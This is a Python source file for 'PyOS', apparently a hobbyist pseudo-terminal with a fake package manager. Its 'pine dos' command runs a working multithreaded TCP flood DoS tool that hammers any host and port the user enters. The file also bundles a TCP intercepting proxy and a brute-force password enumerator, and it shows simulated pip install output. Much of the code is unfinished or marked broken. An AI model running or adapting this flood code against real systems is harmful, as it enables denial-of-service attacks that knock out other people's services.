from ast import Constant
import os
import webbrowser
import requests
import sys
import time
import socket
import random
import tkinter as tk
import threading

if not os.path.exists("v.txt"):
    with open("v.txt", "w") as f:
        f.write("1.0")
    os.system(sys.executable + " main.py")
            
with open("v.txt", "r") as f:
    if f.read() == "2.0":
        version = "2.0"
    elif f.read() == "1.0":
        version = "1.0"

# PYOS 1.0 SECTION #
with open("v.txt", "r") as f:
    version = f.read()
if version == "1.0":
    # If pkgs.pyos is not found, create it.
    
    class ConsoleColors:
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        BOLD = '\033[1m'
        WHITE = '\033[0m'
    
    if not os.path.isfile("pkgs.txt"):
        with open("pkgs.txt", "w") as file:
            file.write("")

    UpdateLog = "\nFixed DoS attack.\nAdded a ping command.\nFixed Root 'or' error.\nAdded '-h' and '-help' command.\nAdded an update log command.\nAdded (beta) GUI"

    from threading import Thread

    def passcracker():
        import itertools
        import time

        # Brute force function
        def tryPassword(passwordSet, stringTypeSet):
            start = time.time()
            chars = stringTypeSet
            attempts = 0
            for i in range(1, 9):
                for letter in itertools.product(chars, repeat=i):
                    attempts += 1
                    print(''.join(letter))
                    letter = ''.join(letter)
                    if letter == passwordSet:
                        end = time.time()
                        distance = end - start
                        return (attempts, distance)


        password = input("\n(Made by Error) Password >")
        # Allowed characters
        stringType = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\",<.>/?"
        tries, timeAmount = tryPassword(password, stringType)
        print("Cracked the password %s in %s tries and %s seconds!" % (password, tries, timeAmount))
        os.system(sys.executable + " main.py")

    def proxy():
        with open("pkgs.txt", "r") as file:
            if not "pkgproxy" in file.read():
                print("\nPackage not installed.")
                os.system(sys.executable + " main.py")
            elif "pkgproxy" in file.read():
                def hexdump(src, length=16):
                    result = []
                    digits = 4 if isinstance(src, str) else 2

                    for i in range(0, len(src), length):
                        s = src[i:i + length]
                        hexa = b' '.join([b"%0*X" % (digits, ord(x)) for x in s])
                        text = b''.join([x if 0x20 <= ord(x) < 0x7F else b'.' for x in s])
                        result.append(
                            b"%04X   %-*s   %s" % (i, length * (digits + 1), hexa, text))

                    print(b'\n'.join(result))


                def receive_from(connection):
                    buffer = b''

                    # We set a 2 second time-out. Depending on your target this may need
                    # to be adjusted
                    connection.settimeout(2)

                    try:

                        # keep reading into the buffer until there's no more data or we
                        # time-out
                        while True:
                            data = connection.recv(4096)
                            if not data:
                                break
                            buffer += data

                    except TimeoutError:
                        pass

                    return buffer


                # modify any requests destined for the remote host
                def request_handler(buffer):
                    # perform packet modifications
                    return buffer


                # modify any responses destined for the local host
                def response_handler(buffer):
                    # perform packet modifications
                    return buffer


                def proxy_handler(client_socket, remote_host, remote_port, receive_first):
                    # connect to the remote host
                    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    remote_socket.connect((remote_host, remote_port))

                    # receive data from the remote end if necessary
                    if receive_first:
                        remote_buffer = receive_from(remote_socket)
                        hexdump(remote_buffer)

                        # send it to our response handler
                        remote_buffer = response_handler(remote_buffer)

                        # if we have data to send to our local client send it
                        if len(remote_buffer):
                            print("[<==] Sending %d bytes to localhost." % len(remote_buffer))
                            client_socket.send(remote_buffer)

                    # now let's loop and read from local, send to remote, send to local
                    # rinse wash repeat
                    while True:
                        # read from local host
                        local_buffer = receive_from(client_socket)

                        if len(local_buffer):
                            print("[==>] Received %d bytes from localhost." % len(local_buffer))
                            hexdump(local_buffer)

                            # send it to our request handler
                            local_buffer = request_handler(local_buffer)

                            # send off the data to the remote host
                            remote_socket.send(local_buffer)
                            print("[==>] Sent to remote.")

                        # receive back the response
                        remote_buffer = receive_from(remote_socket)

                        if len(remote_buffer):
                            print("[<==] Received %d bytes from remote." % len(remote_buffer))
                            hexdump(remote_buffer)

                            # send to our response handler
                            remote_buffer = response_handler(remote_buffer)

                            # send the response to the local socket
                            client_socket.send(remote_buffer)

                            print("[<==] Sent to localhost.")

                        # if no more data on either side close the connections
                        if not len(local_buffer) or not len(remote_buffer):
                            client_socket.close()
                            remote_socket.close()
                            print("[*] No more data. Closing connections.")
                            break


                def server_loop(local_host, local_port, remote_host, remote_port,
                                receive_first):
                    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                    try:
                        server.bind((local_host, local_port))
                    except socket.error as exc:
                        print("[!!] Failed to listen on %s:%d" % (local_host,
                                                                local_port))
                        print("[!!] Check for other listening sockets or correct "
                            "permissions.")
                        print(f"[!!] Caught exception error: {exc}")
                        sys.exit(0)

                    print("[*] Listening on %s:%d" % (local_host, local_port))

                    server.listen(5)

                    while True:
                        client_socket, addr = server.accept()

                        # print out the local connection information
                        print("[==>] Received incoming connection from %s:%d" % (
                            addr[0], addr[1]))

                        # start a thread to talk to the remote host
                        proxy_thread = threading.Thread(target=proxy_handler, args=(
                            client_socket, remote_host, remote_port, receive_first))
                        proxy_thread.start()


                def main():
                    # no fancy command line parsing here
                    if len(sys.argv[1:]) != 5:
                        print("Usage: ./proxy.py [localhost] [localport] [remotehost] "
                            "[remoteport] [receive_first]")
                        print("Example: ./proxy.py 127.0.0.1 9000 10.12.132.1 9000 True")
                        sys.exit(0)

                    # setup local listening parameters
                    local_host = sys.argv[1]
                    local_port = int(sys.argv[2])

                    # setup remote target
                    remote_host = sys.argv[3]
                    remote_port = int(sys.argv[4])

                    # this tells our proxy to connect and receive data
                    # before sending to the remote host
                    receive_first = sys.argv[5]

                    if "True" in receive_first:
                        receive_first = True
                    else:
                        receive_first = False

                    # now spin up our listening socket
                    server_loop(local_host, local_port, remote_host, remote_port, receive_first)


                main()

    def showproxy():
        print("Collecting proxy")
        time.sleep(.25)
        print("Downloading proxy-0.0.17.tar.gz (1.3 MB)")
        time.sleep(.25)
        print("|████████████████████████████████| 1.3 MB")
        time.sleep(.25)
        print("urllib3>=1.18.1 in ./opt/anaconda3/lib/python3.9/site-packages (from prox) (1.26.7)")
        time.sleep(.25)
        print("""pysocks in ./opt/anaconda3/lib/python3.9/site-packages (from prox) (1.7.1)
    Collecting peewee
    Downloading peewee-3.14.10.tar.gz (855 kB)

    |████████████████████████████████| 855 kB""")
        time.sleep(.25)
        print("""bottle in ./opt/anaconda3/lib/python3.9/site-packages (from prox) (0.12.19)
    pyyaml in ./opt/anaconda3/lib/python3.9/site-packages (from prox) (3.13)""")
        time.sleep(.25)
        print("""Collecting python-geoip-python3
    Downloading python_geoip_python3-1.3-py2.py3-none-any.whl (7.4 kB)
    six in ./opt/anaconda3/lib/python3.9/site-packages (from prox) (1.16.0)
    Building wheels for collected packages: prox, peewee
    Building wheel for prox (setup.py) ... done
    Created wheel for prox: filename=prox-0.0.17-py3-none-any.whl size=1280817 sha256=7e903ca4647f28a6a2e02c3c5d1e84bd7313d883ee8ef63bd3f876da68423613
    Stored in directory: /Users/bradygustafson/Library/Caches/pip/wheels/2a/f8/41/14343b0173c2ab530b6d4d329582457a9c0a6241039f13b072
    Building wheel for peewee (setup.py) ... done
    Created wheel for peewee: filename=peewee-3.14.10-cp39-cp39-macosx_10_9_x86_64.whl size=246441 sha256=ce7f7b7c24780534042a27a6e3a48c08021982707375d72d78a1232cfeb35bde
    Stored in directory: /Users/bradygustafson/Library/Caches/pip/wheels/d4/3b/45/78524740e3ad0fa7e62aab3d0acd1c4d2f4157897f401c66c2
    Successfully built prox peewee

    Installing collected packages: python-geoip-python3, peewee, prox

    Successfully installed peewee-3.14.10 prox-0.0.17 python-geoip-python3-1.3
    """)

    def showdos():
        print("Collecting dos")
        time.sleep(.5)
        print("Downloading dos (15 kB)")
        time.sleep(.25)
        print("flask in ./opt/anaconda3/lib/python3.9/site-packages (from dos) (1.1.2)")
        time.sleep(.25)
        print("""arrow in ./opt/anaconda3/lib/python3.9/site-packages (from dos) (0.13.1)
    python-dateutil in ./opt/anaconda3/lib/python3.9/site-packages (from arrow->dos) (2.7.5)
    itsdangerous>=0.24 in ./opt/anaconda3/lib/python3.9/site-packages (from flask->dos) (2.0.1)
    click>=5.1 in ./opt/anaconda3/lib/python3.9/site-packages (from flask->dos) (8.0.3)
    Jinja2>=2.10.1 in ./opt/anaconda3/lib/python3.9/site-packages (from flask->dos) (3.0.3)
    Werkzeug>=0.15 in ./opt/anaconda3/lib/python3.9/site-packages (from flask->dos) (2.0.2)
    MarkupSafe>=2.0 in ./opt/anaconda3/lib/python3.9/site-packages (from Jinja2>=2.10.1->flask->dos) (2.1.0)
    six>=1.5 in ./opt/anaconda3/lib/python3.9/site-packages (from python-dateutil->arrow->dos) (1.16.0)""")
        time.sleep(.25)
        print("Installing collected packages: dos")
        print("\nSuccessfully installed dos")

    def dos():
        with open("pkgs.txt", "r") as file:
            if not "pkgdos" in file.read():
                print("\nPackage not installed.")
                os.system(sys.executable + " main.py")
            else:
                class ConsoleColors:
                    HEADER = '\033[95m'
                    OKBLUE = '\033[94m'
                    OKGREEN = '\033[92m'
                    WARNING = '\033[93m'
                    FAIL = '\033[91m'
                    BOLD = '\033[1m'
                    
                print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
                 ____       ____      _____           _ 
                |  _ \  ___/ ___|    |_   _|__   ___ | |
                | | | |/ _ \___ \ _____| |/ _ \ / _ \| |
                | |_| | (_) |__) |_____| | (_) | (_) | |
                |____/ \___/____/      |_|\___/ \___/|_|
                        written by: depascaldc
                        for private USAGE ONLY
                        Make sure you have the
                        permission to attack the
                            given host
                            
                Source Code: https://github.com/depascaldc/DoS-Tool
                            
                    ''')
                    
                def getport():
                    try:
                        p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
                        return p
                    except ValueError:
                        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
                        return 80

                host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "Host:\r\n")
                port = getport()
                speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run:\r\n"))
                threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count:\r\n"))

                ip = socket.gethostbyname(host)

                bytesToSend = random._urandom(2450)

                i = 0;



                class Count:
                    packetCounter = 0 

                def goForDosThatThing():
                    try:
                        while True:
                            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            try:
                                dosSocket.connect((ip, port))
                                for i in range(speedPerRun):
                                    try:
                                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")
                                        Count.packetCounter = Count.packetCounter + 1
                                    except socket.error:
                                        if ip.find == "localhost":
                                            print("Woops! Please use an IP address.")
                                        print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
                                    except KeyboardInterrupt:
                                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
                            except socket.error:
                                print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
                            except KeyboardInterrupt:
                                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
                            dosSocket.close()
                    except KeyboardInterrupt:
                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
                try:
                        
                    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
                _   _   _             _      ____  _             _   _             
               / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
              / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
             / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
            /_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                                             |___/ 
                        ''')
                    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ")
                    time.sleep(1)
                    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====               ] 25%")
                    time.sleep(1)
                    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========          ] 50%")
                    time.sleep(1)
                    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [===============     ] 75%")
                    time.sleep(1)
                    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%")
                    
                    for i in range(threads):
                        try:
                            t = Thread(target=goForDosThatThing)
                            t.start()
                        except KeyboardInterrupt:
                            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
                except KeyboardInterrupt:
                    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
                    os.system(sys.executable + " main.py")

    def ping():
        request = root.split("ping ")[1]
        print("")
        for i in range(10):
            start = time.time()
            socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((request, 80))
            end = time.time()
            print("Ping: " + str(end - start) + " seconds.")
            time.sleep(1)
        print("")
        os.system(sys.executable + " main.py")

    # Install Test #

    # Needs Fixing #
    def install(DoS):
        print("Installed" + package + " successfully.")
        os.system(sys.executable + " main.py")
        pkgdos = True
    # Needs Fixing #
        
    # Install Test #

    beta = False

    while beta == True:
        # Needs Fixing #
        if open("cdlocal.txt", "r") == "":
            with open("cdlocal.txt", "w") as f:
                f.write("root")
        # Needs Fixing #

    cdlocal = "root" # Broken #


    print("")
    root = input(ConsoleColors.WHITE +"root: ~ $ ")

    # | Command Callers | #

    # | DoS | #
    if root == "pine dos":
        dos()

    # | CD | #
    if root.find("cd") != -1:
        print("\n Error: " + root + "\n \n Comment: CD Is currently not working. :(")
        os.system(sys.executable + " main.py")
        
        # Needs fixing #
        while beta == True:
            print("\n Running CD...\n ")
            with open("cdlocal.txt", "w") as f:
                    f.write(root)
            time.sleep(.5)
            os.system(sys.executable + " Commands/CD/cd.py")
        # Needs fixing #
    # | No Sudo | #
    elif root.find("sudo") != -1:
        print("")
        print("""Error: 'sudo'

    Comment: Sudo is not used in PyOS. Instead use 'pine'.""")
        os.system(sys.executable + " main.py")
    # | Pine Install | #
    if root.find("pine install") != -1:
        package = root.split("pine install")[1]
        if package == "" or package == " ":
            print("")
            print("Error: Package name not found.")
            os.system(sys.executable + " main.py")
            
        elif not package == "":
                print("")
                if package == " dos" or package == " DoS":
                    with open("pkgs.txt", "r") as f:
                        if "pkgdos" in f.read():
                            print("Error: Package already installed.")
                            os.system(sys.executable + " main.py")
                        elif not "pkgdos" in f.read():
                            with open("pkgs.txt", "a") as file:
                                file.write("pkgdos\n")
                            showdos()
                        os.system(sys.executable + " main.py")
                elif package == " proxy":
                    with open("pkgs.txt", "r") as f:
                        if "pkgproxy" in f.read():
                            print("Error: Package already installed.")
                            os.system(sys.executable + " main.py")
                        elif not "pkgproxy" in f.read():
                            with open("pkgs.txt", "a") as file:
                                file.write("pkgproxy\n")
                            showproxy()
                            os.system(sys.executable + " main.py")
                else:
                    print("Error:" + package + " not found.")
                    os.system(sys.executable + " main.py")

    elif root == "py ripthatgit":
        os.system(sys.executable + " ripthatgit.py")
        
    # | Pine Help | #
    if root == "pine help":
        print("""
    Pine Usage:
    'pine install <package>' - Install a package.""")   
        os.system(sys.executable + " main.py")
        
    # | CMD Not Found | #
    if root == "pine":
        print("Pine usage: 'pine <command>' or 'pine help'")
        
    # | Denial Of Service | #
    if root == "pine ddos":
        print("\n Error: " + root + "\n Comment: Please use 'pine dos' instead.\n")

    # | All Imports | #

    # Needs Fixing #
    while beta == True:
        if root == "py imports":
            print("Pip Install (Copy and paste in terminal to install):\n\npip install webbrowser\npip install requests\npip install system\npip install time\npip install socket\npip install random\npip install netfilterqueue\npip install scapy\npip install re\n")
    # Needs Fixing #
        
    if root.find("-i") != -1:
        if root.find("install"):
            print("\nError: " + root + " not found.\n\n Do you mean 'pine install' ?")
            os.system(sys.executable + " main.py")
            
    # | Ping | #
    if root.find("ping") != -1:
        ping()
        
    # | Help | #
    if root == "-h" or root == "-help":
        print("All commands:\n\n pine <command>\n pine dos (Launches a DoS attack menu)\n py ripthatgit (Gets a topic and downloads all of the github projects with the same topic)\n pine install <package> (Install Packages)\n -h (Help)\n -help (Help)\n ping <ip> (Ping an IP Address.)\n '-ul' or '-updatelog' (Shows an update log)\n 'py gui' (Launches a [beta] GUI Menu)")
        os.system(sys.executable + " main.py")
        
    # | Update Log | #
    if root == "-updatelog" or root == "-ul":
        print(UpdateLog)
        os.system(sys.executable + " main.py")
        
    # | Proxy | #
    if root == "pine proxy":
        print("\nProxy is being fixed. Sorry!")
        os.system(sys.executable + " main.py")
        
    # | Pass Cracker | #
    if root == "pine password-cracker" or root == "pine pwcrack":
        passcracker()
        
    # | PyOS 2.0 UI Update | #
    if root == "pine -v 2":
        msg = "\nLoading"
        for x in range(3):
            msg = msg + "."
            print(msg)
            time.sleep(1)
            os.system("clear")
        os.system("clear")
        
        print("\nPyOS has been updated to version 2.0!\n")
        with open("v.txt", "w") as f:
            f.write("2.0")
        os.system(sys.executable + " main.py")
        

    # | GUI Menu | #
    if root == "py gui":
        
        # Root #
        root = tk.Tk()
        root.title("PyOS")
        root.geometry("500x500")
        root.resizable(0,0)
        
        # Title #
        Title = tk.Label(root, text="PyOS")
        Title.pack()
        
        # DoS #
        DoS = tk.Button(root, text="DoS")
        DoS.pack()
        
        # Ping #
        Ping = tk.Button(root, text="Ping")
        Ping.pack()
        
        # Exit #
        Exit = tk.Button(root, text="Exit")
        Exit.pack()
        
        # Input IP #
        GimmeIP = tk.Label(root, text="Please enter the IP Address.")
        GimmeText = tk.Text(height = 2, width = 20)
        inp = GimmeText.get(1.0, "end-1c")
        SubmitIP = tk.Button(root, text="Submit")
        
        def ping():
            print("\nSorry but this will crash the GUI.\n")
            request = GimmeText.get(1.0, "end-1c")
            for i in range(10):
                start = time.time()
                socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((request, 80))
                end = time.time()
                print("Ping: " + str(end - start) + " seconds.")
                time.sleep(1)

        Ping.bind("<Button-1>", lambda event:[Ping.pack_forget(), DoS.pack_forget(), Exit.pack_forget(), Title.pack_forget(), GimmeIP.pack(), GimmeText.pack(), SubmitIP.pack()])
        SubmitIP.bind("<Button-1>", lambda event:[ping(), root.quit()])
        DoS.bind("<Button-1>", lambda event:[dos])
        Exit.bind("<Button-1>", lambda event:[root.quit()])
        
        root.mainloop()

    # IF NOT FOUND #
    #else:
            #print("")
            #print("Error: Command '" + root + "' not found.")
            #os.system(sys.executable + " main.py")
            
# PYOS 2.0 SECTION #
if version == "2.0":
    print("\nLaunching PyOS Version 2.0\n")
    os.system("clear")
    class ConsoleColors:
                    HEADER = '\033[95m'
                    OKBLUE = '\033[94m'
                    OKGREEN = '\u001b[32m'
                    WARNING = '\033[93m'
                    FAIL = '\033[91m'
                    BOLD = '\033[1m'
                    
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + """

Welcome to                                                            
        ,-.----.                        ,----..               
        \    /  \                      /   /   \   .--.--.    
        |   :    \                    /   .     : /  /    '.  
        |   |  .\ :                  .   /   ;.  \  :  /`. /  
        .   :  |: |                 .   ;   /  ` ;  |  |--`   
        |   |   \ :    .--,         ;   |  ; \ ; |  :  ;_     
        |   : .   /  /_ ./|         |   :  | ; | '\  \    `.  
        ;   | |`-', ' , ' :         .   |  ' ' ' : `----.   \ 
        |   | ;  /___/ \: |         '   ;  \; /  | __ \  \  | 
        :   ' |   .  \  ' |          \   \  ',  / /  /`--'  / 
        :   : :    \  ;   :           ;   :    / '--'.     /  
        |   | :     \  \  ;            \   \ .'    `--'---'   
        `---'.|      :  \  \            `---`                 
          `---`        \  ' ;                                  
                        `--`                                   
                                                Update 2.0\n\n""")
    root = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "Root -> ")
    
    # | Change Version | #
    if root == "pine -v 1":
        answer = input("\nAre you sure you want to change to version 1.0? (Y/N) > ")
        if answer == "Y" or answer == "y":
            with open("v.txt", "w") as f:
                f.write("1.0")
            os.system("clear")
            os.system(sys.executable + " main.py")
        elif answer == "N" or answer == "n":
            os.system(sys.executable + " main.py")